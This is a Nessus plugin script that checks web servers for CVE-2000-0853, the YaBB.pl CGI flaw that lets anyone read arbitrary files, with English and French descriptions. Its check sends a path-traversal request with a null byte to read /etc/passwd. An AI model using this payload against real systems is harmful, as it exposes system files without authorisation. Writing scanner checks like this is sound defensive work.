#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10512);
 script_version ("$Revision: 1.15 $");
 script_bugtraq_id(1668);
 script_cve_id("CVE-2000-0853");
 name["english"] = "YaBB";
 name["francais"] = "YaBB";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'YaBB.pl' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove 'YaBB.pl' from /cgi-bin or upgrade to the latest version.

Risk factor : Serious";


 desc["francais"] = "Le cgi 'YaBB.pl' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de 
faire lire des fichiers  arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin ou mettez-le à jour 

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/YaBB.pl";
 summary["francais"] = "Vérifie la présence de /cgi-bin/YaBB.pl";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/YaBB.pl?board=news&action=display&num=../../../../../../etc/passwd%00");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 	security_hole(port);
}
